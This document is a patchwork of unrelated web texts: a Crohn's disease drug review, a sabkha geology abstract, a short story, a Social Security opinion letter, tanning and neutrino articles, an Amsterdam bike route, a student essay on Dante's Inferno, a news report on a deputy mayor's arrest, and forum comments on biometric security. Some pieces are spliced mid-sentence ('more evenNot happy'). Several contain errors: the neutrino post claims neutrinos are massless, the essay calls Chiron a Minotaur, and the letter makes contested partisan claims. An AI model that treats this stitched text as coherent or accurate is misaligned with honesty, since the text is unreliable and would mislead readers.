There were few differences in selected adverse events between groups.
Other outcomes were also reported as were some results for patients who did not respond to treatment.
A Markov model was used to estimate the costs of adalimumab and infliximab; this indicated that both adalimumab and infliximab were cost-effective for induction therapy in severe Crohn's disease and adalimumab was was cost-effective in moderate Crohn's disease. Neither drug was cost-effective as maintenance therapy for either moderate or severe disease. Total costs to the NHS were estimated at between £17 million and £92 million for induction treatment in severe disease only; targeted treatment would reduce these estimates. Maintenance therapy would have a much higher total cost, at between £140 million and £200 million for one year.
Anti-TNF therapy with adalimumab or infliximab may have a beneficial effect compared with standard care on outcome measures for induction and maintenance therapy for Crohn's disease. However, multiple methodological problems with the available evidence meant that the relative efficacy of the medications could not be determined.
The review questions and inclusion criteria were clear. The search was thorough and did not include restrictions on language or publication status. The authors reported using methods designed to reduce reviewer bias and error at all stages of the review process. Validity was assessed appropriately and key concerns incorporated into the synthesis and conclusions. The decision to use a narrative synthesis reflected the nature of the included trials including the concerns about the quality of the evidence and the small numbers of patients. The authors' conclusions reflect the results of the review and appear likely to be reliable.
Practice: The authors did not state any implications for practice.
Research: The authors identified the need for independently funded RCT research on the effectiveness of anti-TNF therapy for Crohn's disease. They made detailed recommendations for the types of trials which were required and the methods which should be adopted in their design and conduct; these were documented in the report.

Geological Society of America Bulletin

AbstractAn ascending-brine model is proposed to address the observed isotope geochemistry, solute composition, and solute and water fluxes in the coastal sabkha of the Emirate of Abu Dhabi. Mass-balance measurements document that >95% of the solutes are derived from ascending continental brines; minor amounts are derived from rainfall and from groundwater entering from upgradient areas. Nearly 100% of the annual water loss is from evaporation and not lateral discharge. Direct rainfall on the sabkha and subsequent recharge to the underlying aquifer account for ~ 90% of the annual water input to the system; the remaining 10% comes from both lateral and ascending groundwater flow. Thus, the water and solutes in this system are from different sources. Solute concentrations of conservative (i.e., nonreactive) elements in the coastal, sabkha-covered aquifer are consistent with the fluid pore volumes of ascending brine calculated from hydrologic properties. Calcium to sulfate ratios and sulfur isotopes are consistent with this source of solute from the underlying Tertiary formations. Recharging rainwater dissolves halite and other soluble minerals on the surface, causing the solution to become more dense and sink to the bottom of the aquifer where it vertically mixes with less dense ascending brines. Solutes are returned to the surface by capillary forces and recycled or lost from the system by eolian or fluvial processes. Thus, the system becomes vertically mixed, consistent with the presence of tritium throughout the aquifer; but there is essentially no horizontal mixing of seawater with groundwater. The observed seawater solutes in the supratidal zone come from interstitial seawater trapped by the rapid progradation of the sediments into the Arabian Gulf and are not refluxed or laterally mixed. The ascending-brine model contrasts significantly with both the seawater-flooding and evaporative-pumping models previously proposed as a source of solutes to the coastal sabkha of the Emirate of Abu Dhabi. Use of these earlier models leads to incorrect conclusions and raises serious questions about their applicability in the evaluation of sabkhat in the geologic record.

With arms and legs splayed as wide and long as they could reach, Annabelle, the human X, plastered her five-year-old body across the back seat of the family Plymouth. She had the whole back half of the car all to herself that Sunday because her sister, Inés, who’d been coughing and sneezing all night long, had to stay home with their mother.
So it was just Annabelle and her father in the car on their way to Coney Island to spend the day with Nonno. As they pulled out of the parking spot in front of the three-story apartment building in Fresh Meadows, Annabelle’s father had made a deal with her. If she was good in the car – no jumping, no screeching, no whining -- she would get to ride on the merry-go-round.
At first Annabelle sat on the passenger side, where she could lean forward without annoying her father, then she slid over to the middle where she watched the cars on the road behind her through the rear view mirror. After awhile she hopped over to the side behind her father where she studied the back of his head up close, the freckles on his bald spot, the white hairs among the black. She flipped herself over and tried lying on her belly. Then she dropped to the floor and hunkered down behind the hump in the car floor. It was cozy and dark down there. She folded her arms to form a pillow and rested her head. Pretty soon, lulled by the motion of the car, she drifted off.
When Annabelle’s father took her to the merry-go-round, he would only let her ride on the white horse.
“But I always go on the white one. Why can’t I ride on that horse, daddy,” she would say, pointing to a bright red steed with a flowing mane.
Her father would shake his head. “No, Annabelle, you’re still too young for the horses that go up and down.”
Oh sure, the white horse was pretty enough to look at, but the problem was, when the calliope whistle blew, when the merry-go-round lurched forward, that white horse just stood there with his front hoof raised as if he were about to make a move — but he never did. He just stood frozen stiff as the merry-go-round turned. Meanwhile, Inés, who was almost eight, was allowed to ride on the up-and-down horses – the palomino, the chestnut mare.
But today it was Nonno who would take her to the merry-go-round. Her father had some paper work to do for Nonno – his bills, his taxes.
Nonno was a slender, handsome old man with a bushy mustache and a friendly smile. He walked with Annabelle down the blocks that led from his green asphalt tile row house to the boardwalk. Annabelle held on to her grandfather’s hand, skipping beside him to keep pace.
It was just Annabelle and Nonno — tall, kind Nonno in his grey cardigan, his black suspenders. She told Nonno she was old enough to go on the up and down horses.
"I wanna go on that one,” she begged, pointing to the shiny red up-and-down horse with the yellow saddle trimmed in blue.
Nonno picked her up, walked over to the horse, propped her up on the yellow saddle and stepped down from the circular platform so he could wave at her from the sidelines. The merry-go-round began to turn.
Annabelle held on tight to the neck of the wooden horse. At first she was able to hold her own. But it was rough going. The up-and-down motion was a force she’d never before experienced; she had to grip her arms and legs tightly to stay up straight. Other kids made it look so easy. Other kids held on with one hand only. Other kids had one arm free to reach out and grab … what? What were they grabbing at? And why? She’d never been sure.
A golden ring. She saw it now and knew the reason the kids were reaching out. On the outer rim of the merry-go-round platform, on one of the poles that supported the roof, a golden ring stuck out like a tongue. As the platform turned and their horses passed the pole, the kids would reach way out to their right, straining to hook their index fingers into the shiny hoop, pull it out of the slot. (If they were skilled enough to snag a ring, they could redeem it for a free ride – Annabelle learned this later from her cousin Frances.)
Annabelle wanted one of those rings. She was feeling more confident now. She reached out and tried her luck at grabbing the ring, but her arm didn’t want to stretch as far as she needed it to. On the next go round, as her horse approached the golden ring, she leaned her body out beyond his neck, straining to reach the prize.
By the time her attention jerked back from the ring, back to what was going on with her body there on the red horse, she had already begun to slide off the yellow saddle.Though she clung to the horse's neck, her body was slipping further and further down the side of the horse. Her arms ached.
Just as they were about to give out, Nonno jumped onto the moving platform, ran to his granddaughter’s side and caught her in his arms. She buried her face in the curve of his neck and let him carry her off the merry-go-round. As they walked back to Nonno’s house together in silence, Annabelle wondered if he would tell her father about what happened to her on the up-and-down horse.
Later on that afternoon, Annabelle sat at the kitchen table with her head propped in her hands, watching her father cut the horseshoe of hair that remained on Nonno’s head, clip the scraggly fur on the back of his neck, shave his beard and trim his mustache. Snippets of coarse white hair flew from his eyebrows, his nose, his ears. Finer, softer hair floated down from his head onto last week’s edition of the Brooklyn Eagle spread flat on the linoleum floor under his feet. Nonno sat patiently at the head of the table, a white towel draped over his shoulders, gazing out the back door at the long, narrow backyard, the tomato garden, the grape arbor, the fig tree. From time to time, he beamed his gaze Annabelle’s way and winked at her.

Everyone worries what the Republicans will do to or with the Social Security program. Well, let's see what the Democrats, who are touted as the protectors of Social Security.
President Roosevelt, a Democrat, put the Social Security Program in place. The money from America's workers went into the Social Security Trust fund.
Along comes President Johnson, a Democrat and his "Great Society" and the expansion of the Vietnam war. President Johnson and his Democratically controlled House and Senate, took the Social Security funds out of the trust fund and put them in the general fund so they could use money as they wished.
Along comes President Carter, a Democrat. He and his fellow Democrats decided that immigrants in this country, at age 65, could receive money from the Social Security Program even though they never paid a penny into it.
Finally, the Democrats started taxing our Social Security benefits, with Al Gore casting the deciding vote as President of the Senate.
I believe if the Social Security Fund had been left alone, there would be plenty of money for all Americans upon their retirement.
I would like to see a member of Congress or the Senate to put forth a bill to put all Social Security funds back into the Trust fund as it was designed. However, I believe none of them have the intestinal fortitude to try and make this happen.
In addition, with all of the Americans out of work today, there is a significant decrease of money going into this fund. Social Security as we know it will have to be changed. We should elect the ones who will bring the jobs back and start the new ones. The incumbents have had their chance. It is now truly time for a change.

BeverageSunless tanning is considered a convenient alternative to sunbathing. It gives the skin a tanned look without the harmful ultraviolet rays. Although sunless tanning is widely accepted as safe, sunless products may carry some risks depending on how they are used.
Sunless tanning is usually achieved by applying a cream, gel, lotion, or spray to the skin. In most tanning products, the active ingredient is dihydroxyacetone (DHA). DHA reacts with dead skin cells on the outermost layer of skin and temporarily darkens the skin. The coloring doesn’t wash off, but gradually fades as the dead skin cells slough off. Skin cells renew often and the epidermis renews itself completely every month or so.
Sunless tanning may be useful for individuals who want to be tanned, but are fair skinned and burn easily. It also may be useful for individuals who want to be tanned year-round, and don’t want to go to tanning beds.
What results may be expected from Sunless Tanning products?
Sunless tanning products usually go on clear, and darken the skin gradually. Individuals may see results after an hour, or within eight to 24 hours. However, some sunless tanning products contain a tint that begins darkening the skin immediately.
Sunless spray-on tanning is available at tanning salons. These tans are sprayed evenly over the entire body. Sunless tans usually last five to seven days. If an individual wishes to maintain the sunless tan, it is recommended that application occur every three days.
The Food and Drug Administration (FDA) considers DHA safe when applied to the skin. DHA darkens the skin by reacting with the amino acids on the skin’s surface. However, the risks, if any, of inhaling or ingesting DHA are unknown. Therefore, proper precautions should be taken to prevent DHA from getting into or near the eyes, nostrils, or lips. During spray-on tanning, individuals are often encouraged to wear protective devices like goggles and nose plugs. Generally, sunless tanning methods are regarded as safe alternatives to sunbathing.
No. Sunless tanning pills are regarded as unsafe, and are not approved by the FDA. These pills contain an ingredient called canthaxanthin, which is a color additive. Canthaxanthin settles in parts of the body, including the skin, when taken in large quantities. It can cause canthaxanthin retinopathy, and hepatitis. Retinopathy is the formation of yellow crystals in the retina of the eye. Tanning pills can also cause nausea, cramps and diarrhea.
There are many different brands of sunless tans. Since all sunless tan products use the same active ingredient, it is easy to find an affordable brand at a local drugstore.
Many sunless tanning products suggest adding additional coats every three hours to obtain the desired color. However, since sunless tanners can continue to darken for many hours, they should not be reapplied for at least twelve hours after the initial application.
For very light skinned individuals, dark-tanning products should not be used. Light skinned individuals should start with a very light tanning product, and gradually use darker products.
The product should be applied evenly and lightly. The skin should be exfoliated prior to application to remove excess dead skin cells. This allows for a more even application because the skin’s surface will be smooth. Less of the sunless tanning product should be applied to dry skin or thickened skin, like over the knees and elbows, since they tend to absorb the product more readily.
Individuals should wait 15 to 20 minutes after the product is applied to dress which may help avoid staining clothes. Shaving body hair may be considered for a more evenNot happy with the mobile phone network? Neutrinos are the way to go! A group of American scientists have achieved the transfer of information using a beam of neutrinos. The process is highly inefficient at the moment, though, with a transfer speed of merely 1 bit/s and the test being over very short distances.
The Minerva Detector at Fermilab
The experiment is ongoing at the NuMI facility at Fermilab. This facility produces some of the most energetic neutrino beams. This teams up with the Minerva detector kept 1km away from the source! The current experiment was performed on this setup
But why neutrino communication?
Neutrinos are very weakly interacting particles in nature. They have often been describes as ‘ghostly’, owing to the difficulty in detecting them. They are uncharged and thus do not interact with the electromagnetic field. Having no mass means that gravity is out of the question, although, even with a small mass, it wouldn’t have played a role.
Neutrinos can pass through hundreds of lightyears of solid lead! It’s not surprising that they should be able to tunnel through the Earth itself. It is due to this unwillingness to interact that neutrinos can be made into effective communication devices. There would be very little disturbance that would pour into the signal.
The problem is this: Neutrinos being very difficult to detect, are also extremely difficult to control. They cannot be collimated (i.e. made parallel) as easily as lightwaves. Similarly, we need a large flux of neutrinos from the source and a very good detector at the receiving end. The detector is not portable. In fact, neutrino detectors are HUGE! (Pic above)
“Neutrinos” using neutrinos
The idea is to modulate the neutrino beam so that a proper piece of information is transmitted. What is the first message to be tranferred? Simple: “Neutrinos”. The modulation bitrate was 0.1 bit/s, which is WAY slower than today’s communication devices. However, the information was transmitted over a few kilometers and the error was less than 1%.
Much work needs to be done! But, Wolfgang Pauli, the father of the neutrino, would be proud.Next Day

Distance: 9 miles (14.5 km)
Cyclists rule the roads in Amsterdam, which has a well-deserved reputation as the world's best and most beautiful biking city. Every route is a scenic one, lined with elegant Dutch townhouses and festive street cafés, and the only hills are those over the historic canal bridges. Start by picking up an upright bike, just like the locals, for $14 per day at Mike's Bike Tours, near Leidseplein in the southwest section of the central city. Bike through the square, then cross the Singelgracht canal into Museumplein, a lovely park that is home to three of Amsterdam's major museums: the Van Gogh Museum; the Rijksmuseum, the national museum that houses a major collection of Dutch masters; and the city's museum of modern art, the Stedelijk Museum. From here, it's just a few blocks north to Vondelpark, Amsterdam's largest and most popular park. Ride the lovely, 3-mile (5 km) loop around the park, then head north back into the central canal district along the Prinsegracht canal. It's an especially beautiful one, which takes you past the Anne Frank House and the Westerkerk, the tallest church tower in Amsterdam. Take a left on Westerstraat to the Jordaan, a former working-class neighborhood that has become an artists' (and diners') enclave. Locals love Toscanini or, for outdoor dining, Café de Jordaan. Head south on the Keizergracht to return to Mike's.

Canto III, the exposition, brings us to the "Gates of Hell". Not many people desire to gaze upon these gates engulfed with pure-evil and encased with treacherous lands. As they exhume deeper, and deeper into the darker regions of the "underworld" they will open their eyes to what is, rather than what was. The Inferno. That is what lies ahead for Virgil and Dante. Canto III of Dante's Inferno delivers a powerful main idea which supports the personified "Hell" that Dante and Virgil journey into.
Main Idea, the most important information that tells more about the overall idea of a paragraph, story, or section of a text. Canto III has a very elaborate main idea. To begin with, we find ourselves with Dante and Virgil reaching the gates of Hell. Once inside, Dante says, "Master, what is that I hear? Who are / those people so defeated by their pain?" (Mandelbaum 32-33). Dante and Virgil are in the anti-inferno, a place which resides within Hell, but is not a part of it. Virgil describes the "anti-inferno" and the obscure noises that Dante hears:
This miserable way / is taken by the sorry souls of those / who lived without disgrace and without praise. / They now commingle with the coward angles, / the company of those who were not rebels / nor faithful to their God, but stood apart. / The heavens, that their beauty not be lessened, / have cast them out, nor will deep Hell receive them / even the wicked cannot glory in them. (Mandelbaum 34-42)
Dante and Virgil are face to face with the "sorry souls of those / who lived without disgrace and without praise." (Mandelbaum 35-36). Therefore, when these "non-believers" die they venture out here. Due to, their negligence to choose between right and wrong, good and evil, they are all damned to wander the wasps infected chambers for all time. Neither Heaven nor Hell wants them. They are at the mercy of the "Anti-Inferno". Obviously, Dante and Virgil have come across an un-imaginable place, but what lies ahead, is raging in blood and fire.
When we first lay our eyes on Canto III we read it, scratch our head, and say, "what does that word mean? Who are they talking about?" When that moment of Figurative-Amnesia occurs, you have just stumbled upon personification, and diction. Dante's Inferno Canto III if loaded to the brim with both. As evidence, gaze upon the opening of Canto III:
THROUGH ME THE WAY INTO THE SUFFERING CITY, / THROUGH ME INTO. (Mandelbaum 1-9)
This is what Dante and Virgil first see when they approach the gates of Hell. Also, this is a foreboding inscription that is placed in the entrance to give a warning to those who enter. HELL is not just a place, no; it is a living, breathing person who will bring pain and un-imaginable torture. With this message, we can see how powerful its meaning really is. For instance: eternal pain, divine authority, primal love, and eternal things; all have a strong adjective to strengthen its meaning. Meanwhile: justice urged, endure eternally, and abandon every hope; all have strong verbs. Which in essence, serves as a strong understatement to what we are experiencing and trying to grasp while these two individuals "surf" thru Hell. Furthermore, without the strong diction, we would not be able to transcend its meaning. What they are personifying in this "Hellish Statement" is Hell itself. As stated above, Hell is a suffering city, an eternal pain, a way that runs among the lost. Hell is not just a place anymore, it has become something else. In quintessence, the statement above is a warning that needs to be looked upon with fear, and read with agonizing-pain. With the use of personification you can turn this phrase into an emotional-rollercoaster. With the uses of great diction and personification there is extraordinary explanation. For the reasons above, without the stalwart diction and personified "Hell" we would not grasp the internal and external meaning of this vile place we refer to as "The Inferno".
The Divine Comedy, Dante's Inferno Canto III is an exquisite exposition to the explanation of the first, but many layers of the Inferno. However, it is only describing what the boarder of hell has to offer to those unfortunate souls who have become non-believers. A place where god and bad reside to only endure the agonizing pain that is brought upon by, "horseflies and by wasps that circled them. / The insects streak their faces with their with their blood, / which, mingled with their tears, fell at their feet, / where it was gathered up by sickening worms." (Mandelbaum 66-69). In other words, Canto III of Dante's Inferno shows a delectable and well thought-out main idea that is well-supported by the personified "Hell" to which Dante and Virgil start their voyage.
Dante's Inferno Canto III pain of acknowledging the fact that there is no Hope. Canto IV is exactly that, a hopeless circle for those who were born without the Christian faith, or, they were not baptized in the name of the Almighty. Canto IV of Dante's Inferno provides a virtuous main idea which is well supported by the symbolism of Pagans who have permanently resided there.
Canto IV of Dante's Inferno has a unique main idea. To begin with, Dante awoke from his "fainting-spell" to find himself across Acheron, and on the brink of Hell. Here, Dante and Virgil are in "Limbo" (Circle One of Hell) with "The Virtuous Pagans":
They were born without the light of Christ's revelation, and, therefore, they cannot come into the light of God, but they are not tormented. Their only pain is that they have no hope. (49)
These are the souls who were not born during the Christianity faith and/or were not baptized in the name of God. Therefore, they neither are to be tortured nor have humility. However, they are living in luxury compared to other circles of Hell. For instance:
We reached the base of a great Citadel / circled by seven towering battlements / and by a sweet brook flowering around them all. / This we passed over as if it were firm ground. / Through seven gates I entered with those sages / and came into a green meadow blooming round. (106-111)
This is describing a great fortress surrounded by a small, natural stream of fresh water. In addition, there is a meadow blooming around the inner-complex of the castle. Without a doubt, Dante and Vigil have come across the most "mellowed-out" circle of Hell, this will be their last one, and so, they proceed onward into the dark treacherous-caverns of the unknown.
Symbolism, this is a specific idea or object to represent ideas, values, or ways of life. Canto IV is filled up to the brim with it. As evidence, in stanzas eighteen through twenty-one Virgil states:
I was still new to this estate of tears / when a Mighty One descended here among us, / crowned with the sign of His victorious years. / He took from us the shade of our first parent, / of Abel, his pure son, of ancient Noah, / of Moses, the bringer of law, the obedient. / Father Abraham, David the King, / Israel with his father and his children, / Rachel, the holy vessel of His blessing, / and many more He chose for elevation / among the elect. And before these, you must know, / no human soul had ever won salvation. (52-63)
The people in these stanzas symbolize those who were exempt from the "no-salvation" rule that God placed. Caused by, Jesus Christ who granted these souls amnesty, when he descended into Hell during between the time of his death and his resurrection. This is called "The Harrowing of Hell", when Jesus Christ ventured into Hell. Take Moses for example. He was a profit that was commanded by God to deliver the Hebrews from slavery. So he did. Moses guided the Hebrew slaves out of Egypt, through the Red Sea. They wandered in the desert for 40 years until they reached the Land of Israel. Even though, back then there was no Christianity, or baptizing, Moses still obeyed God. Notice how he was "commanded" to deliver the Hebrews from slavery. He was obedient, and he brought over the greatest laws known to man, "The Ten Commandments". He was given a task, he accepted it, and he got his "just rewards". He does not fit the rules of Limbo. In the same way, Noah was commanded by God to build an Ark to save a core stock of the world's animals from the Great Flood. Once again, "commanded", he was yet another exception to the rule. Unquestionably, these "Pagans" symbolize the Great Divide between having faith and rather than hoping for it.
The Divine Comedy, Dante's Inferno Canto IV is an exquisite description of the first circle of Hell. Brought about by the insightful descriptions of those who were non-believers. Not because they chose to be, but, because there was not one. For the reasons above, Dante's Inferno Canto IV was a virtuous circle in Hell which portrayed a well thought-out main idea that was well-supported by symbolic Pagans who have come to terms with their permanent home. Their only home.
Dante's Inferno Canto IV
The Divine Comedy, Dante's Inferno Canto XII is all about those who went against ones neighbors. Now, Dante and Virgil have arrived to the First Ring of the Seventh Circle of Hell. Here, you will see a river of blood which boils the sinners who were violent against their "neighbors". Canto XII of Dante's Inferno provides a vengeful main idea which is well supported by the symbolism of a Minotaur guarding the lake of boiling-blood.
Canto XII of Dante's Inferno has a very descriptive main-idea. To begin with, Dante and Virgil have progressed to Ring One of the Seventh Circle of Hell (as seen at the bottom of the webpage). This circle of hell captures the sinners who were violent against their neighbors, ". . . for we draw near / the river of blood that scalds / those who by violence do injury to others" (46-48). Furthermore, they are to forcefully reside in this river of blood and not rise to high above the water. For the sin they committed was not pleasent, they do not deserve the right to "stand-up" and beg for forgivness. The problem these poor unfotunate souls face is the arrows that will be unleashed upon them if they were to rise too high above the boiling lake. In any case, they are dammed to boil flesh and all as payment for their sinful ways. Forever to feel pain, and dread in return for the pain and suffering they gave when they had life.
Notwithstanding, symbols are one of the main objects or creatures in a story. In Canto XII there is a major symbol that Dante and Virgil encounter. The Minotaur. The Minotaur is a Greek mythological creature that is part man part bull. During their decent they encounter a Minotaur, Chiron wielding a bow and arrow. Chiron. In addition to symbols, look at the bow and arrow. It was created from a Greek/Roman god Apollo. Apollo is the god of: light and the sun, archery, medicine, healing and plague, music, poetry, truth and prophecy, arts and many more talents that seem to be wrapped around the same description as the Minotaur Chiron. Chiron was known for his knowledge and skill with medicine. In Contrast with Canto XII, Chiron was not friendly and kind. He was going to shoot an arrow directly at Dante. If Virgil did not step in to stop Chiron from releasing his deadly shot, Dante would have been injured severely. If Chiron is so kind and full of humility, why is he in Hell? Why was he charged with this novel task of smiting those who rise too high above the water? Perhaps, Chiron is there to heal those who have sinned wrongfully upon the Almighty. Maybe, Chiron is there because he is civilized and intelligent enough to understand why he is there in the-first-place.
Dante's Inferno Canto XII
The Divine Comedy, Dante's Inferno Canto V is all about lustful-sinners. Now, Dante and Virgil have arrived to the Second Circle of Hell. The Judgment Realm. Here, you will find those souls that used lust to guide their way to commit a Sin. With that in mind, they must face the grueling and tortuous winds that are created in this realm of "lust". Canto V of Dante's Inferno provides a lustful main idea which is well supported by the symbolism of those who are "visa-less", and cannot travel outside that circle.
Canto V of Dante's Inferno has a very descriptive main-idea. To begin with, Canto V reveals to us how souls get placed into their individual realm of Hell. For instance, Dante and Virgil are in circle two of Hell. Just after, they left into the darkness from "imbo"with "he Virtuous Pagans". This circle has a "demon" by the name of Minos. His job goes as follows:
There dreadful Minos stands, gnashing his teeth: / examining the sins of those who enter, / he judges and assigns as his tail twines. / I mean that when a spirit born to evil / appears before him, it confesses all; / and he, the connoisseur of sin, can tell / the depth of Hell appropriate to it; / as many times as Minos wraps his tail / around himself, that marks the sinners level (4-12).
These are the souls who allowed for lust to drive their better judgment. However, in order for them to receive lust, they committed a sin in the process, adultery. Without a doubt, Dante and Virgil are face to face with those who are being judged, not only for all of the sins committed against God's will, but, sins that have defined their own humility.
Symbolism, this is a specific idea or object to represent ideas, values, or ways of life. Canto V has well supported symbolism built in. As evidence, in stanzas four through six we are introduced to the one that brings fourth judgment to those who committed sins. "There dreadful Minos stands, gnashing his teeth: / examining the sins of those who enter, / he judges and assigns as his tail twines" (4-6). Now, Minos was a mythical king of Crete, son of Zeus and Europa. After his death, Minos became a judge of the dead in Hades. Compared to, Canto V of Dante's Inferno, Minos is the judge in Hell. Hell and Hades are basically the same; the only difference is that Hades is the Greek Underworld. Furthermore, Canto V describes circle two of Hell. For example, "And just as cranes in flight will chant their lays, / arraying their long file across the air, / so did the shades I saw approaching, borne / by that assailing wind, lament and moan" (46-49). This statement symbolizes the power of "lust", which blows one about uncaringly and pointlessly. In comparison to, Francesca da Rimini and her husband's brother Paolo, to which she committed adultery too, then suffered a violent death at the hands of her husband. Both, Francesca da Rimini and Paolo reside in circle two of Hell. Unquestionably, symbolism can come from the simplest of form, from a mere mythological figure, to something more meaningful like emotions.
The Divine Comedy, Dante's Inferno Canto IV is a well-rounded chapter. It describes how one mere mortal is judged and placed into a group. Hell is not a place anyone wants to end up, but, as we journey deeper into this story we begin to understand its deeper meaning. Everyone can make a mistake. Everyone can sin upon the Almighty. But, the difference between those who do it and those who are forgiving is bravery. The leap of Faith is all that is needed to truly be forgiven. For the reasons above, Dante's Inferno Canto V is a hope-seeking circle in Hell which portrayed a well thought-out main idea that was well-supported by symbolic themes and mythological characters.

The altercation allegedly happened on July 30 when Goldsmith, 64, and his wife, Margaret Goldsmith, 59, got into a verbal dispute, which escalated into the former deputy mayor shoving his wife into a counter, the report said.
He allegedly grabbed a phone out her hand and threw it to the ground when she tried to call police.
"I should have put a bullet through you years ago!" Margaret Goldsmith yelled at her husband, according to the Washington, DC, police report.
After breaking the phone, Goldsmith "grabbed [Margaret] and refused to let her go," the document said.
Goldsmith spent two days in jail after the altercation, The New York Times reported.
Goldsmith resigned five days later with the mayor's office saying he was leaving to "pursue private-sector opportunities in infrastructure finance.”
The mayor's office declined to comment to The Times about what they knew when Goldsmith resigned.
At least one city official called for answers from the mayor's office.
"I am deeply troubled by the news that one of the mayor's highest-ranking aides resigned weeks ago after being arrested in a reported domestic violence incident, and spent two nights in jail — but we are only learning this today, said Manhattan Borough President Scott Stringer in a statement.
"The Mayor and his staff should give a full accounting of what they knew and when they knew it. 'No comment' is not an acceptable response. "
Goldsmith served as deputy mayor for only 14 months. He was criticized during what people saw as the city's inadequate response to the blizzard last December.
Goldsmith downplayed the incident in a statement and said he resigned in order to not be a distraction for the mayor.
"Margaret and I agree that the facts have not been accurately portrayed," he."Ready or Not, Biometrics Finally in Stores 317

Why stop with the steady stream of articles that point out the real shortcomings of biometrics? So you can keep your job? Sorry, but that's a pretty selfish reason that only works for you, your boss, and a handful of investors.
As Bruce Schneier pointed out years ago, biometrics are a double edged sword. Biometrics are hard to forge (I am deliberately ignoring the $0.50 gelatin trick that fools fingerprint readers since I assume someone will repair that particular shortcoming,) and look to the implementations of the systems for the weaknesses instead. Yes, they are hard to forge. But once the data is turned into bits, it's pathetically easy to copy. And you can't put the genie back in the bottle it once it's gone!
It comes down to "who do you trust?" Do you really trust the department store or the bank to not keep a copy of your biometric identification? What's to keep an unscrupulous merchant from intercepting a copy of your raw biometric data, and saving a copy?
I see signature capture pads all over the place these days. I categorically refuse to use them because I have no confidence that my signature won't be captured and replayed by the wrong person. You can't tell me that a "secure" system will prevent this, because I can't tell a secure system by looking at one. The promise of Open Source is no guarantee, either. Even if it had a picture of a penguin on the outside, a spiffy GNU-y logo, and OSF and SourceForge brand stickers on it, how do I know it's really "IdentifyMe_2.0" and not some hacked-up demo being run by Vinnie the Chiseler? People believe that when they walk into a Home Despot that Home Despot doesn't keep a permanent record of their signature. Of course they keep it; it's actually required by law to retain the audit copy for 36 months (42 in Illinois.)
There are also plenty of known cases [google.com] of fraudulent ATM machines that read your card, accept your PIN, spit out "TEMPORARILY UNABLE TO DISPENSE CASH", and report both your card and PIN to the machine's owner. How is a user supposed to be able to authenticate the biometric device is genuine; that it's not a sham, running a copy for a thief?
How will this change with fingerprinting, hand geometry, retinal scans, or whatever the biometric system of the week may be? It won't; it can't. And since the systems can never be trusted to not "steal" or retain copies of identification for future playback, the systems should never be used in the first place. Using them even one time will put your irreplaceable data in a system it may never escape from.
Biometrics are a technology that should not ever be mainstreamed. They might work fine for a secure military facility, but once they're out in the general populous for any length of time, the protections they represent are gone.

Preface: I am posting AC and not naming any names here.
In the mid-to-late 1990s, when the phrase "identity theft" had first entered the lexicon but before the media discovered how well they could capture audiences with its mere mention, I worked with a card issuer on a so-called "secure card" test program. The idea was twofold: merchants were getting complacent in terms of trying to verify that the person presenting the card was actually the cardholder, and credit card fraud was an increasing problem.
The proposed solution to both dilemmas was to issue cards with the cardholder's PHOTOGRAPH on the FRONT of the card. We'd indemnify cardholders against any fraudulent purchases (as opposed to beyond the first $50.. it was a novel idea back then) for any bogus transaction made with one of these photocards. Cashiers weren't bothering to check the back for a signature, but surely they'd see if the photo on the front matched the person making the purchase, right? LOL.
Existing cardholders were allowed to volunteer for the test program by responding to an insert in their bill. Along with the application, they had to send in a photocopy of their drivers' license, and a small color photograph of themselves which was easily identifiable as the same person in the drivers license photo. About 10,000 such cards were eventually issued, with surveys included and sent as a follow-up to see what the cardholders encountered. During the test period, here are a few interesting things we found.
1... Merchants weren't checking the photo, even though it was right there as a 1.5" x 1.5" image on the front left side of the card.
Many cardholders reported no problem giving their spouse the card to use, where the photo wasn't even the same sex as the person making the purchase.
There were a lot of folks surprised that cashiers didn't even notice the photograph.
There were a lot MORE folks surprised that cashiers noticed the photograph but paid it no attention. For example, female customer would use card issued to JOHN DOE with a picture of a man on the card, no questions asked by merchant.
2... Merchants who did check the photo were overly attentive.
People who had changed hairstyles, dyed their hair, grown or shaved facial hair since the photo had been taken, or even gained or lost weight were having their cards refused because the photo wasn't a "perfect" match.
If a card was not outright refused due to appearance changes, a store manager was often called by the cashier, or some other delay was introduced into the purchase, inconveniencing both the cardholder and the merchant.
3... Some of the merchant services reps around the country were issued temporary expense cards with someone else's name and photograph on them (intentionally, as part of the test).
These cards were set to return a "Call" response on transaction attempts, which tells the merchant they need to call the card issuer to get special instructions before accepting the card.
Many merchants ignored the response and ran the transaction through as a "Force" process without bothering to see if there was a problem with the card. In live circumstances this would have resulted in a chargeback to the merchant with no recourse.
Merchants who did call were instructed to check the ID of the customer against the name and photo on the card. In nearly half of these cases, the merchants wound up doing a Force anyway (another chargeback). The reps were told to try and explain it away - "Oh that's my boyfriend's card" etc - and it worked pretty well.
4... Though this obviously is not the party line... Credit cards are as good as cash but provide next to zero security. Ask yourself when was the last time you tried making a purchase on plastic a

ATMs are secured this way. You've gotta have your card, know your pin, and look somewhat like you for the camera. (Looking wrong doesn't yet deny the transaction... but is a great tool when it comes to figuring out the "Whodunit?" that comes up when ATM fraud is discovered.)
In-store credit cards are slightly less secure. The card has to be present, and the person using the card has to perform the task of creating the proper signature that's on the card. (Again, a wrong signature might not always deny the transaction, but it creates a paper trail for later.) Some stores are advanced enough to also associate the security camera timecode to the transaction to create the visual trail as well, but that's not used as much as it could be as of yet.
Internet or phone card transactions are weaker because there's no demand that either a card or person been seen. That's why those transactions are also more expensive to get processed... they're more likely to result in a write-off from a scam transaction. They are less secure, and that's an admission of it. Still, smart e-merchants can protect themselves by performing some secondary security like only shipping to addresses related to the card.
Biometrics if used alone just the "somethng you are" test, but as we've seen it's going to be confused some of the time. Merging the fingerprint with a PIN number would at least get us to a two-test level of security... but the marketers of biometrics are insisting that their test alone is good enough. That's where they're seriously wrong, no test alone will ever be that good... that's why it's always best to double-check.

Every security system known can be broken (including one time pads - if you human engineer a way into getting one of pads - which has been done in the past by secretly capturing one user of a pad, and forcing him to carry on the conversation while relaying the information to his captors).
But the harder a system is to break, the more it deters the use of false or stolen identities.
For example, to replace pictures with biometrics would be stupid. To add biometrics increases the difficulty of the forget. Etc.
A useful authentication system would be one where it takes a lot of work to forge a single identity, and that work would have to be repeated to forge another one. Biometrics in common with other systems have the promise of making such systems.
When I last worked with biometrics (a long time ago), the problem was that you could not get an acceptable false positive rate at the same time that you got an acceptable false negative rate. But when biometrics are combined with other systems, you can allow higher false positives (and hence fewer false negatves = rejections), because the other systems add security. And the whole thing becomes harder to break, making it less worthwhile to break unless you try to protect something way too valuable with it.
